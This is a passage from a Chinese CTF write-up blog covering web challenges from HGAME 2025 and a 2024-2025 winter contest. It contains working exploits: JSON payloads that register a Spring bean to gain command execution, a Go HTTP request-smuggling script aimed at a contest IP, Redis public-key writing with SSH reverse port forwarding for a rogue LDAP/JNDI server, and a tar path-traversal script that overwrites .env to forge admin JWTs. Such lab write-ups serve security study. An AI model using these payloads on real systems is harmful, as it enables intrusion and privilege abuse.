(String)map.get(<span class="hljs-string">&quot;beanName&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> (String)map.get(<span class="hljs-string">&quot;methodName&quot;</span>);<br>            Map&lt;String, Object&gt; params = (Map)map.get(<span class="hljs-string">&quot;params&quot;</span>);<br>            <span class="hljs-keyword">if</span> (StrUtil.containsAnyIgnoreCase(beanName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CharSequence</span>[]&#123;<span class="hljs-string">&quot;flag&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;flagTestService offline&quot;</span>, (Object)<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> InvokeUtils.invokeBeanMethod(beanName, methodName, params);<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">200</span>, (String)<span class="hljs-literal">null</span>, result);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">500</span>, ((Throwable)Objects.requireNonNullElse(e.getCause(), e)).getMessage(), (Object)<span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现这里需要提供Spring的bean，可以对应到类上，提供该bean类的方法和参数，然后就会invoke触发这个方法。</p><p>当然给的<code>FlagTestService#catFlag</code>触发不了，因为<code>flag</code>这里被ban了而且绕不了。</p><p>但是转念一想，这里既然都能invoke直接触发方法了，那么我们能不能找到一个bean类先使用这个代码注册一个恶意bean，然后在调用这个恶意bean的方法来R呢？</p><p>这个方法是可行的。本地调试的时候将视角放到了<code>cn.hutool</code>的一系列包，从中找到了一个完美契合需求的东西（感觉出题人就是为了这叠醋才包了这盘饺子吧）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cn.hutool.extra.spring.SpringUtil#registerBean<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250219004318408.png" alt="image-20250219004318408"></p><p>这个方法可以帮助我们注册一个恶意bean对象，那么需要注册的能实现RCE的也能找到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cn.hutool.core.util.RuntimeUtil#execForStr<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250219004444051.png" alt="image-20250219004444051"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250219004452969.png" alt="image-20250219004452969"></p><p>游戏结束了。</p><p>srds应该能找到的恶意类不止这个，在它包里能用的应该还有其他的。</p><p>思路出来了，第一次注册一个恶意bean，名字取作<code>evilCmd</code>，beanName提供为<code>cn.hutool.extra.spring.SpringUtil</code>，注册类为<code>cn.hutool.core.RuntimeUtil</code>，注意这里注册类要使用<code>@type</code>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;beanName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cn.hutool.extra.spring.SpringUtil&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;methodName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;registerBean&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;arg0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;evilCmd&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;arg1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;cn.hutool.core.util.RuntimeUtil&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后直接触发：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;beanName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;evilCmd&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;methodName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;execForStr&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;arg0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ipconfig&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>注意这里要传数组形式，也就是写个中括号那种。</p><p><img src="/2025/02/04/HGAME2025-WEB/10a9a1b766fb5da8b4a528a46f79ecbe.png" alt="img"></p><p>远程一把通，但是反弹shell有点问题，可能是不出网，这里就直接读了：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250219005621394.png" alt="image-20250219005621394"></p><h2 id="Level-111-不存在的车厢"><a href="#Level-111-不存在的车厢" class="headerlink" title="Level 111 不存在的车厢"></a>Level 111 不存在的车厢</h2><p>给的源码可以发现它自己分了前后端逻辑，前端用proxy接收HTTP请求，后端自己写了个H111协议接收proxy交付的请求并给出response。</p><p>这里其实很容易想到HTTP请求走私的打法，而这里只需要找到前后端分段出现歧义的地方，就可以在前端GET访问<code>/</code>时同时走私POST请求让后端访问<code>/flag</code>。</p><p>注意到：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214005955940.png" alt="image-20250214005955940"></p><p>bodyLength使用的是uint16储存，即范围为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>-<span class="hljs-number">65535</span><br></code></pre></td></tr></table></figure><p>而且GET请求其实是能携带body的，所以这里就可以打一个请求的溢出，第一段溢出让他丢弃前面65535长度的包从而把后面走私的POST请求当作新的请求向后端要flag。</p><p>只是本地和靶机跑的时候容易宕机，本地调试的时候也容易死，远程是大概打2-3次可以走私成功直接获得flag：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>anyChars := []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;whatever&quot;</span>)<br>expected := []<span class="hljs-type">byte</span>&#123;<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x04</span>, <span class="hljs-comment">// method length</span><br><span class="hljs-number">0x50</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>, <span class="hljs-comment">// method: POST</span><br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-comment">// URI length</span><br><span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-comment">// URI: /flag</span><br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// header count</span><br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// body length</span><br>&#125;<br>padding := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">65519</span>) <span class="hljs-comment">// 65536 - 17 = 65519</span><br>body := <span class="hljs-built_in">append</span>(anyChars, expected...)<br>body = <span class="hljs-built_in">append</span>(body, padding...)<br><br><span class="hljs-comment">// 创建请求</span><br>req, err := http.NewRequest(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://175.27.221.240:30154&quot;</span>, bytes.NewReader(body))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;error creating request:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>req.Header.Set(<span class="hljs-string">&quot;Content-Length&quot;</span>, fmt.Sprintf(<span class="hljs-string">&quot;%d&quot;</span>, <span class="hljs-built_in">len</span>(body)))<br><br><span class="hljs-comment">// 发送请求</span><br>client := &amp;http.Client&#123;&#125;<br>resp, err := client.Do(req)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;error sending request:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br><span class="hljs-comment">// 读取响应</span><br>respBody, err := io.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;error reading response:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>fmt.Println(<span class="hljs-string">&quot;Response received:&quot;</span>, <span class="hljs-type">string</span>(respBody))<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/ba68576286f795075a256585025a437a.png" alt="img"></p><p><a href="https://blog.csdn.net/u011410254/article/details/140543297">go 中的uint16、int16 、int32区别和转换问题及其他细节理解-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_32261191/article/details/140269419">HTTP 请求走私漏洞详解_request smuggling-CSDN博客</a></p><p><a href="https://www.freebuf.com/articles/web/375462.html">高级漏洞篇之HTTP请求走私专题 - FreeBuf网络安全行业门户</a></p><h2 id="Level-257-日落的紫罗兰"><a href="#Level-257-日落的紫罗兰" class="headerlink" title="Level 257 日落的紫罗兰"></a>Level 257 日落的紫罗兰</h2><p>最喜欢的一道，这道题拿下了一血。</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214010406872.png" alt="image-20250214010406872"></p><p>给了两个tcp容器，很容易发现第一个是ssh的服务，第二个是一个redis的服务，题目给出了user.txt，最开始还以为是打ssh的爆破，大米老师在这里爆了很久很久hhh</p><p>其实不然，发现第二个是redis后，就能想到可能是打redis的枚举用户登录，然后写公钥或者写计划任务反弹shell这种。</p><p>找到工具可以一键打用户枚举并写公钥：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214010730959.png" alt="image-20250214010730959"></p><p>发现mysid用户已经写入了我们的公钥，那么直接SSH连接第一个靶机：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214010755617.png" alt="image-20250214010755617"></p><p>拿到shell后，可以发现根目录确实有flag，但是没权限读。</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214010919987.png" alt="image-20250214010919987"></p><p>suid提权也无果，<code>ps -aux</code>看看进程：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214010952032.png" alt="image-20250214010952032"></p><p>发现&#x2F;app下以root权限启动了一个jar包，那么接下来不出意料就是打java了。</p><p>拖下源码进行审计：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214011107140.png" alt="image-20250214011107140"></p><p>使用的是search方法来进行ldap服务客户端的配置，这里直接打JNDI不可行。</p><p>而且ssh那个机子其实没有发现服务端的东西，源码配置里的<code>ldapurl</code>是本地的389端口，而机器上389端口啥也没有。</p><p>那么我们的思路应该就是自己写一个恶意LdapServer上去，然后RCE。</p><p>这道题原题被赵哥一眼丁真了，太赛棍了：</p><p>[JQCTF2024、RCTF2024 Web Writeup - Boogiepop Doesn’t Laugh](<a href="https://boogipop.com/2024/05/27/JQCTF2024%E3%80%81RCTF2024">https://boogipop.com/2024/05/27/JQCTF2024、RCTF2024</a> Web Writeup&#x2F;#OpenYourEyesToSeeTheWorld)</p><p>思路如上不在赘述，打一个Jackson的POJONode触发就可以JNDI了。</p><p>本地调试直接通了：</p><p><img src="/2025/02/04/HGAME2025-WEB/49dda3b43e34308038b3abfa77db7cd6.png" alt="img"></p><p>但是有个问题是远程环境是不出网的，所以不能直接反弹个root的shell。</p><p>但是ssh我们能直接登录，所以不需要打内存马，只需要chmod个777就ok。</p><p>靶机还贴心的给了curl，那么我们直接在ssh机器上交互就完事了，虽然有等号&#x3D;的黑名单，原题用json下的unicode绕过，我们可以直接url编码绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST http://127.0.0.1:8080/search -d <span class="hljs-string">&quot;baseDN=dc%3Djavasec,dc%3Deki,dc%3Dxyz%2F0&amp;filter=(cn%3Dtest)&quot;</span><br></code></pre></td></tr></table></figure><p>那么怎么把这个服务弄过去呢？</p><p>我们还能发现java并没有在&#x2F;bin或者&#x2F;usr&#x2F;bin里：</p><p><img src="/2025/02/04/HGAME2025-WEB/1524682e0aa65a1afa26a85a6dd3f59f.png" alt="img"></p><p>而且还有个问题，由于389端口低于1000，而低于1000的端口一般没root不能自己起。所以直接传jar包过去本地起这个做法肯定是行不通的。</p><p>所以需要用类似打渗透的思路解题，这里很容易想到ssh的端口转发，我们在vps上起这个服务，然后转发到这个ssh的389端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i ~/.ssh/id_rsa -p 30376 -R 389:localhost:389 -R 8888:localhost:8888 mysid@node1.hgame.vidar.club -N<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214012030837.png" alt="image-20250214012030837"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214012115679.png" alt="image-20250214012115679"></p><p>酣畅淋漓，大快人心！</p><hr><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总之这次的hgame题目质量不错，第二周也还是挺好玩的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋杯冬季赛2024-2025-WEB</title>
    <link href="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/"/>
    <url>/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>明天西湖，今天练练。</p><p>web第一天挺简单的。</p><h2 id="day1-easy-flask"><a href="#day1-easy-flask" class="headerlink" title="day1-easy_flask"></a>day1-easy_flask</h2><p>SSTI一把梭，没啥好讲。</p><h2 id="day1-file-copy"><a href="#day1-file-copy" class="headerlink" title="day1-file_copy"></a>day1-file_copy</h2><p>给了一个copy的交互，source可控，但是destination不可控，但是会回显source文件的bytes大小，这里就想到了php-filter-chain，通过盲注来将flag带出来。</p><p>具体原理不说了，网上分析phpchain的也有很多。</p><p>当然这里也可以带index.php看看它到底是啥源码：</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250118000435617.png" alt="image-20250118000435617"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$path</span>, <span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<br>        <span class="hljs-variable">$size</span> = @<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<br>        <br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>            <span class="hljs-string">&#x27;size&#x27;</span> =&gt; <span class="hljs-variable">$size</span><br>        ]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>HTML就不读了，太多了又要等10min…</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250117234146293.png" alt="image-20250117234146293"></p><p>最后还差一个一闪而逝的b，很巧的是也有工具能一把梭了。</p><h2 id="day1-Gotar"><a href="#day1-Gotar" class="headerlink" title="day1-Gotar"></a>day1-Gotar</h2><p>第一天唯一有点东西的Web题。</p><p>给了go的源码，其实无非就俩点，一个是tar的文件上传路径穿越，一个是jwt的伪造越权。</p><p>读一下jwt处理的源码，不难发现只要拿到了环境变量的jwtKey就能为所欲为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Claims <span class="hljs-keyword">struct</span> &#123;<br>UserID  <span class="hljs-type">uint</span><br>IsAdmin <span class="hljs-type">bool</span><br>jwt.StandardClaims<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateJWT</span><span class="hljs-params">(userID <span class="hljs-type">uint</span>, isAdmin <span class="hljs-type">bool</span>, jwtKey []<span class="hljs-type">byte</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>expirationTime := time.Now().Add(<span class="hljs-number">24</span> * time.Hour)<br>claims := &amp;Claims&#123;<br>UserID:  userID,<br>IsAdmin: isAdmin,<br>StandardClaims: jwt.StandardClaims&#123;<br>ExpiresAt: expirationTime.Unix(),<br>&#125;,<br>&#125;<br><br>token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)<br><span class="hljs-keyword">return</span> token.SignedString(jwtKey)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> JWTKey []<span class="hljs-type">byte</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">LoadEnv</span><span class="hljs-params">()</span></span> &#123;<br>Env, err := godotenv.Read()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Error loading .env file&quot;</span>)<br>&#125;<br>JWTKey = []<span class="hljs-type">byte</span>(Env[<span class="hljs-string">&quot;JWT_SECRET&quot;</span>])<br>log.Print(JWTKey)<br>&#125;<br></code></pre></td></tr></table></figure><p>但是显然这里是不能R的。很自然我们就会想到能不能env的jwtKey给覆盖掉成为我们自己的可控key，然后自己造一个admin的cookie不就完事了。</p><p>那么怎么覆盖呢？可以发现tar-utils依赖的outputPath函数存在目录遍历漏洞：</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250117235648502.png" alt="image-20250117235648502"></p><p>首先，函数将<code>tarPath</code>按照斜杠（&#x2F;）分割成多个元素，然后移除第一个元素（通常是根目录）接着将这些元素重新组合成一个路径字符串，最后将这个路径基于<code>Extractor</code>的<code>Path</code>属性进行重定位。</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250118000712833.png" alt="image-20250118000712833"></p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250118000724815.png" alt="image-20250118000724815"></p><p>可以发现<code>extractDir</code>、<code>extractSymlink</code>、<code>extractFile</code>都调用了这个<code>outputPath</code>函数。</p><p>不难发现源码中controllers&#x2F;file.go使用了<code>extractTar</code>调用了该依赖库实现解压tar包，因此存在目录遍历漏洞：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">extractTar</span><span class="hljs-params">(tarPath <span class="hljs-type">string</span>, userID <span class="hljs-type">uint</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>userDir := filepath.Join(extractedDir, fmt.Sprintf(<span class="hljs-string">&quot;%d&quot;</span>, userID))<br>err := os.MkdirAll(userDir, os.ModePerm)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br>tarFile, err := os.Open(tarPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">defer</span> tarFile.Close()<br>extractor := &amp;tar.Extractor&#123;<br>Path: userDir,<br>&#125;<br>err = extractor.Extract(tarFile)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> userDir, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>官方wp说题目巧合的在<code>LoginHandler</code>处加载了环境遍历（默认读取.env），因此可以实现覆盖.env文件修改jwt密钥（抽象巧合。。。覆盖.env文件确实没怎么想到）</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250118001111873.png" alt="image-20250118001111873"></p><p>所以只需在一个文件夹里创建.env文件，里面写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">JWT_SECRET=xxx<br></code></pre></td></tr></table></figure><p>然后创建一个tar，这个tar设定路径为..&#x2F;..&#x2F;..&#x2F;..&#x2F;.env就可以路径穿越。</p><p>写成命令行形式就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> exp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;JWT_SECRET=hack&quot;</span> &gt; exp/.env<br>tar --create --file=hack.tar --transform <span class="hljs-string">&#x27;s,exp/,exp/../,&#x27;</span> exp/.env<br></code></pre></td></tr></table></figure><p>这也是UNIX的tar本身的漏洞之一，而且python的tar方法也用的这种方式，所以可以写成这种代码形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Create the directory and .env file</span><br>os.makedirs(<span class="hljs-string">&#x27;exp&#x27;</span>, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp/.env&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>f.write(<span class="hljs-string">&quot;JWT_SECRET=hack&quot;</span>)<br><br><span class="hljs-comment"># Create the tar file with the path traversal</span><br><span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.tar&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>tar.add(<span class="hljs-string">&#x27;exp/.env&#x27;</span>, arcname=<span class="hljs-string">&#x27;exp/../../../.env&#x27;</span>)<br></code></pre></td></tr></table></figure><p>接下来就是普通的注册登录上传造cookie再CSRF的过程，官方用了个一把梭脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs 